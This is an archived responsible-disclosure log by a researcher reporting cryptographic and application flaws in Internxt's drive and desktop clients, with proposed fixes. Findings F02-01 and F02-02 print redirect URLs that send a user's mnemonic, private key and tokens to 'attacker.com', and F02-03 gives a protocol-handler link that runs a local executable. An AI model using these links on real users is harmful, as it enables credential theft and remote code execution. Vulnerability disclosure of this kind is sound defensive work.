---
type: Article
title: Internxt Responsible Disclosure
description: Disclosure log details Internxt root-mnemonic exposure during sharing, weak password-derived encryption and unauthenticated keys. Later findings cover redirect-based credential leaks, desktop protocol-handler execution, plaintext secrets, update verification and sync path traversal, with source-code links and proposed fixes.
resource: "https://schaerli.org/weblog/6-internxt/disclosure/"
tags: [article, webseclist-reference, en, pascal-sch-rli, crypto, key-recovery, open-redirect, credential-theft, uri-scheme, path-traversal, electron, owasp-a01-2021, owasp-a02-2021, owasp-a04-2021]
generated:
  by: webseclist-refs/1
  at: "2026-10-21T11:52:33+00:00"
status: stable
stale_after: 2027-10-21
sources:
  - id: original
    resource: "https://schaerli.org/weblog/6-internxt/disclosure/"
    title: Internxt Responsible Disclosure
also_at: []
authors: []
canonical_url: ""
cited_by:
  - "2026-ai.md:169"
commit: ""
content_sha256: 7634fb08829b0a728ffadd44e38ee27ebc0e60c116a21b45a1361425517b407e
depth: full
depth_reason: default
kind: article
language: en
licence: unknown
original_url: "https://schaerli.org/weblog/6-internxt/disclosure/"
published: ""
publisher: Pascal Schärli
publisher_english: ""
raw_sha256: 9c45f95f4ce31c71b45369951e9e21a9cbcfd9b2c0c122ec1f23077d74fad20f
retrieved_from: "https://schaerli.org/weblog/6-internxt/disclosure/"
retrieved_kind: live
retrieved_utc: "2026-10-21T11:52:33+00:00"
slug: pascal-scharli-internxt-responsible-disclosure
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# Internxt Responsible Disclosure

**Internxt Responsible Disclosure** - Author not stated, Pascal Schärli.

- Published: date not stated
- Original: <https://schaerli.org/weblog/6-internxt/disclosure/>
- Preserved from: https://schaerli.org/weblog/6-internxt/disclosure/ (live) on 2026-10-21
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so
it remains readable if the page goes offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# Internxt Responsible Disclosure

This page lists all findings responsibly disclosed to Internxt. Read the main [blog](https://schaerli.org/weblog/6-internxt/) first for a more accessible digest of my findings.

## 2026-06-27: First disclosure

---

When a folder is shared in Internxt, both the receiver and a malicious backend can retrieve the owner mnemonic, which is the long term secret used to derive all encryption keys across the entire app, so recovering it means recovering the keys to decrypt all of the user files.

There are three variants of this, and the worst one happens in the completely normal flow. When you share with an address that has no account yet, the server precreates the keypair on behalf of that user, so the mnemonic is encrypted to a public key whose private key the server holds. The mnemonic of who shared the folder is therefore in plaintext on the server by design, and only later re encrypted to the real user once they create their own keys. This is a man in the middle by design, and it also fires on a simple typo in the recipient address, leaking your keys to whoever the server precreates. See [`getPublicKeyWithPrecreation`](https://github.com/internxt/sdk/blob/master/src/drive/users/index.ts#L373-L381) which fetches the public key that is used to share the mnemonic in [`shareItemWithUser`](https://github.com/internxt/drive-web/blob/master/src/app/store/slices/sharedLinks/index.ts#L63-L67).

The second variant is internal sharing through a public URL. In this case a `code` is created that is used to encrypt the mnemonic ([`encryptionKey`](https://github.com/internxt/drive-web/blob/master/src/app/share/services/share.service.ts#L290)). Since the `code` is part of the URL path it is visible to the backend (i.e. as logs in the proxy), which can therefore recover the mnemonic too.

The third variant is sharing to an existing user, where the mnemonic is encrypted to the user key of the receiver. For a passive observer the mnemonic is not readable that way, but since the public keys are not authenticated (see later finding `F01-03`), an active adversary could man-in-the-middle the sharing and retrieve the public key like that.

The impact is the most severe possible for an E2EE product. Recovery of the mnemonic gives an attacker the keys to decrypt all files of that user, not just the shared folder. This matters most under a malicious backend model, since the backend already holds all encrypted files, so leaking the mnemonic reduces your security back to a non encrypted option like Google Drive. The deeper issue is your key hierarchy. Every key is derived from the single mnemonic, which makes sharing impossible to do without handing over the root secret. As long as that architecture stands, folder sharing cannot be done securely and should be turned off. A better design might derives each file and folder key from its parent folder key, so you can share a subset of the tree without exposing everything, and in all cases the keys must never reach the backend as they do now. For the immediate term I suggest turning off folder sharing entirely, informing users that any shared folder created in the past has already exposed their key to the backend, and putting the code behind a `#fragment` so it never reaches the server. The long term fix is a redesign so that a share never carries the owner root secret at all.

---

### F01-02: Weak password hashing and key derivation throughout

Passwords and password derived keys across the app are not hardened against offline brute force, allowing the server or anyone that sees these hashes and ciphertexts to efficiently brute-force user credentials.

The worst offender is the mnemonic itself. At signup it is encrypted with [`encryptTextWithKey(mnemonic, password)`](https://github.com/internxt/drive-web/blob/master/src/views/Signup/hooks/useSignup.ts#L139-L141), which goes through [`encryptTextWithKey`](https://github.com/internxt/drive-web/blob/master/src/app/crypto/services/utils.ts#L100-L105). When the keyToEncrypt is a normal String CryptoJS automatically uses legacy EVP_BytesToKey as a KDF, which in this case is just 3 passes of MD5. And this is MD5 hash of the user password, not the mnemonic. An attacker that has this encrypted mnemonic can guess a password, decrypt, and check whether the result looks valid, brute force is extremely fast. And once you crack it you have both the password and the mnemonic, so everything you'll ever need.

The next worst offender are all values encrypted with your custom [`aes.encrypt`](https://github.com/internxt/lib/blob/master/src/aes/encrypt.ts#L16-L27), which uses a default of `2145` PBKDF2 iterations. This is used mostly with the user password which needs to be assumed to be low-entropy. While slightly better than the 3 rounds of MD5 above, it's still very low. There are many of these where some ciphertext encrypted with password using this kdf is sent to backend, any of these can lead to such a brute-force.

Finally, you use a home grown login rather than a proper PAKE (such as OPAQUE). It uses a "secret" shared between clients and server, `[REDACTED]`, which is trivial to extract and provides only obfuscation. In there there is another PBKDF with this time only 10000 iterations with SHA1 which is better than the two before but still nowhere enough. [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#pbkdf2) recommends **1,400,000** iterations in such a case. Other issue with the overall design is that the salt has to be the same every time, so it's not really a challenge-response, and an attacker that sees a valid hash once can do a replay attack on a recorded hash to authenticate. Better to use OPAQUE for your use case.

---

### F01-03: Public keys are never verified, enabling man in the middle on all sharing

Sharing relies on public keys fetched from the server with no verification or trust on first use, so the server can substitute its own key and read anything shared.

When sharing, the recipient public key comes straight from [`getPublicKeyWithPrecreation`](https://github.com/internxt/sdk/blob/master/src/drive/users/index.ts#L373-L381) and is used as is. There is no fingerprint, no pinning, no out of band verification, no [TOFU](https://en.wikipedia.org/wiki/Trust_on_first_use), so a malicious backend can hand back a key it controls. This is already what happens by design in the precreation case from finding `F01-01`, which shows the path is fully under server control.

Separately, every login generates a [fresh keypair](https://github.com/internxt/drive-web/blob/master/src/app/crypto/services/keys.service.ts#L8-L13) that is then discarded. Beyond being wasteful, this lets the server accumulate a list of keys encrypted with the user credentials over time, which may allow other attacks in the future.

---

### F01-04: File contents not authenticated

File content is encrypted with AES-CTR with no reliable integrity, so the server can tamper with ciphertext undetected.

A lot of the ciphers still use AES-256-CTR, which is malleable, so even without the key the server can XOR a chosen part of the ciphertext, for example a known file header, and flip the corresponding plaintext bits. There is sometimes an HMAC, but not all clients check it and the server can simply omit it, [in which case the client does not verify](https://github.com/internxt/drive-web/blob/master/src/app/network/NetworkFacade.ts#L312-L314). The remaining check is a plain hash with no secret, which the server can recompute and replace at will.

---

### F01-05: Self-rolled hybrid PQC encryption

The hybrid encryption misuses Blake3 as a stream cipher with no nonce or context binding, which is fragile and malleable.

In [`hybridEncryptMessageWithPublicKey`](https://github.com/internxt/drive-web/blob/master/src/app/crypto/services/pgp.service.ts#L76-L108) the Kyber shared secret is expanded with [`blake3`](https://github.com/internxt/drive-web/blob/master/src/app/crypto/services/utils.ts#L46-L48) and XORed against the message via [`XORhex`](https://github.com/internxt/drive-web/blob/master/src/app/crypto/services/pgp.service.ts#L58-L67). Because Kyber encapsulate produces a fresh secret per call this is likely safe in practice, but it is fragile, and it is also malleable in the same way as finding `F01-04`, flipping a ciphertext bit flips the plaintext bit. User proper X-Wing and AE isntead.

---

### F01-06: Access tokens persist in localStorage after logout

The shared `folderAccessToken` and `fileAccessToken` JWTs are not cleared on logout, so they remain readable after a user signs out. The [clear function](https://github.com/internxt/drive-web/blob/master/src/services/local-storage.service.ts#L90-L100) iterates the `LocalStorageItem` enum and a few explicit keys, but neither `FOLDER_ACCESS_TOKEN` nor `FILE_ACCESS_TOKEN` from [`STORAGE_KEYS`](https://github.com/internxt/drive-web/blob/master/src/services/storage-keys.ts#L1-L8) is in either list, so the full JWT stays behind. Best would probably be to clear all entries from local storage except for a whitelist of safe-to-keep tokens.

---

### F01-07: Metadata is not encrypted

Filenames, file types and folder structure are stored in plaintext, so the server can read them.

There is a lot of plaintext metadata such as file names, extensions etc that are stored in plaintext in the backend. Such metadata can be valuable on its own and I recommend encrypting as much of the metadata as possible. If you do so make sure to bind the value to it's type and file, i've seen too many such implementations where then two fields can be swapped because there is no good binding used. Use i.e. AES-GCM and in the AD put which file it belongs to and what field it is.

---

### F01-08: Mnemonic and private key passed through a deeplink URL on desktop login

Desktop login completes by passing the plaintext mnemonic and private key through a URL, where long term secrets can end up in logs, history, or be read by other local processes.

The web client builds a redirect URL in [`getUniversalLinkAuthUrl`](https://github.com/internxt/drive-web/blob/master/src/views/Login/UniversalLinkSuccessView.tsx) that carries the mnemonic and the private key as query parameters, and the desktop client reads them back in [`process-login.ts`](https://github.com/internxt/drive-desktop/blob/main/src/apps/main/electron/deeplink/process-login.ts). The destination is a plain loopback URL, so the values can appear in browser history, devtools, and anywhere URLs get logged. These are long term secrets, not short lived tokens, so the exposure is not transient.

## 2026-07-04: Second disclosure

### F02-01: Two-Click leak of mnemonic, private key and all JWT tokens

When the desktop client logs in, it opens a web server locally and then opens the website to perform the login. The website sends the user credentials back through a request to this local server. This pattern should not be used in production software, but the biggest issue is that the website performs zero validation on the redirect URL.

[`UniversalLinkSuccessView.tsx`](https://github.com/internxt/drive-web/blob/ae2ae979b19a1d5ca91be22e8b3a6ca72d5e92eb/src/views/Login/UniversalLinkSuccessView.tsx#L37) takes whatever URL is given in the request and responds with everything needed to log in as this user. An attacker can construct a URL like `https://drive.internxt.com/login?universalLink=true&redirectUri=<base64(https://attacker.com/capture)>`. If the user is logged in, the site shows an "Open App" button. Clicking it redirects the user to `https://attacker.com/capture?mnemonic=${btoa(user.mnemonic)}&token=${btoa(token)}&newToken=${btoa(newToken)}&privateKey=${btoa(user.privateKey)}`. This leaks the user's decrypted mnemonic, private key, and JWT tokens which is enough to completely take over the account and decrypt, modify, and exfiltrate all of the user's files. If a user has an active web session, all that's needed is for the user to visit a malicious site that redirects them to this URL and click "Open App." After getting the credentials, the attacker can redirect back to Internxt Drive to avoid suspicion.

Since it's hard to pass these credentials safely, my best recommendation would be to just have the desktop app handle the login flow itself. It's not easy to pass the credentials securely from the web to your desktop client and if you mess it up there's a lot at stake.

---

### F02-02: One-Click leak of JWT

Similar to **F02-01**, there is another URL that will send the target URL the user's JWT token. This time there was an attempt to validate the target URL, but the protection can be circumvented to leak the JWT token to an attacker controlled server.

The web client's redirect URL validation in [`getRedirectUrl`](https://github.com/internxt/drive-web/blob/ae2ae979b19a1d5ca91be22e8b3a6ca72d5e92eb/src/services/auth.service.ts#L473) uses a substring check instead of a proper origin comparison, allowing an attacker to create a URL like `https://drive.internxt.com/?redirectUrl=https://attacker.com/capture/https://internxt.com?auth=true`. If a user is redirected to this URL from browsing a malicious site or clicking a phishing link, without further confirmation, Drive redirects the user to `https://attacker.com/capture?authToken=<JWT>`, leaking the user's JWT token. Just like before, if a user has an active web session, all that's needed is for the user to visit a malicious site that redirects them to this URL. This time they are redirected automatically without clicking anything. After getting the credentials, the attacker can redirect back to Internxt Drive to avoid suspicion. This is slightly less severe because it does not leak the mnemonic and private key.

The fix is to properly parse the URL and compare origins: `new URL(redirectUrl).origin === allowedDomain`. The `authToken` should also be sent via a URL fragment (`#`) rather than the query string so it does not leak via Referer headers or server logs.

---

### F02-03: One-click RCE on Desktop Clients

An attacker can achieve RCE on a user that has a running internxt desktop client by directing them to a malicious URL.

The desktop app registers `internxt://` as a protocol handler. In [`process-deeplink.ts`](https://github.com/internxt/drive-desktop/blob/a8f4d0eb193b6b39768ab96446fb55a2929139dc/src/apps/main/electron/deeplink/process-deeplink.ts#L19-L22) anything following `internxt://notification/` calls directly to `shell.openExternal` with no scheme validation. On Windows this dispatches to any registered protocol handler including `file:`, allowing an attacker to launch arbitrary executables. Opening `internxt://notification/file:///C:/Windows/System32/calc.exe` in a web browser on Windows with Internxt Drive installed, the calculator launches. An attacker could also host a malicious executable on a SMB share and refer to that to execute arbitrary code.

I'm not sure what the correct usage of this functionality is, I would remove it altogether. If really needed, parse the link with `new URL()` and verify protocol to be `https` and origin only allowed Internxt domains.

---

### F02-04: Mnemonic and private key stored in plaintext on disk

The desktop client persists the user's mnemonic and private key as plaintext JSON. Only one JWT token is encrypted with Electron `safeStorage`, but the most sensitive values are not.

In [`process-login.ts`](https://github.com/internxt/drive-desktop/blob/a8f4d0eb193b6b39768ab96446fb55a2929139dc/src/apps/main/electron/deeplink/process-login.ts#L41-L42), `electronStore.set('userData', user)` stores the mnemonic and private key in plaintext inside `%APPDATA%/internxt-drive/config.json`. The proper way would have been to use Electron's `safeStorage` instead, as is already done for your tokens [here](https://github.com/internxt/drive-desktop/blob/a8f4d0eb193b6b39768ab96446fb55a2929139dc/src/apps/main/auth/service.ts#L16). Infostealer malware routinely scrapes `%APPDATA%` for exactly this kind of file. In combination with **F02-03**, someone could chain it to steal the user's credentials.

Please use electron's `safeStorage` for all values, which will encrypt the values using a key anchored in the OS keychain.

---

### F02-05: Auto-updater has no code-signature verification and is vulnerable to TOCTOU

The auto-update mechanism on the desktop app installs new versions from GitHub without signature verification.

Verification is explicitly disabled in [package.json](https://github.com/internxt/drive-desktop/blob/a8f4d0eb193b6b39768ab96446fb55a2929139dc/package.json#L78). The only integrity control is a SHA-512 hash from the same release, but no Authenticode / code-signing verification. A hash is not sufficient to authenticate the binary, and for end-to-end encrypted applications code signing is especially important.

Please sign your executables and verify signatures on auto-updates. Better is to publish directly through the Microsoft Store, where apps ship as [MSIX](https://learn.microsoft.com/en-us/windows/apps/dev-tools/winapp-cli/guides/electron-packaging) packages.

---

### F02-06: Path traversal via malicious file/folder names in the sync engine

Desktop client validates some filenames but `..` is not rejected as a folder name which allows path traversal.

In [`validate-windows-name.ts`](https://github.com/internxt/drive-desktop/blob/a8f4d0eb193b6b39768ab96446fb55a2929139dc/src/context/virtual-drive/items/validate-windows-name.ts#L14), the pattern `/[<>:"/\\|?*]|^\s|\s$/` does not match `..`, so it passes validation. In [`Traverser.ts`](https://github.com/internxt/drive-desktop/blob/a8f4d0eb193b6b39768ab96446fb55a2929139dc/src/context/virtual-drive/items/application/Traverser.ts#L32-L45), `join(currentFolder.absolutePath, file.name)` with `name = '..'` resolves to the parent of the intended folder.

The validation should include `..`, `.`, empty strings, and control characters in the validator before path construction. Best is to add a post-`join` containment check to verify the result is still where you expect it.

---

### F02-07: processLogin logs mnemonic fragment

In [`process-login.ts`](https://github.com/internxt/drive-desktop/blob/a8f4d0eb193b6b39768ab96446fb55a2929139dc/src/apps/main/electron/deeplink/process-login.ts#L24), an invalid mnemonic triggers `throw new Error('Invalid mnemonic: ${mnemonic.slice(0, 20)}')` and the first 20 characters are written to `drive.log` and `drive-important.log` via `logger.error`.

The fix is to throw a generic error without the mnemonic fragment.
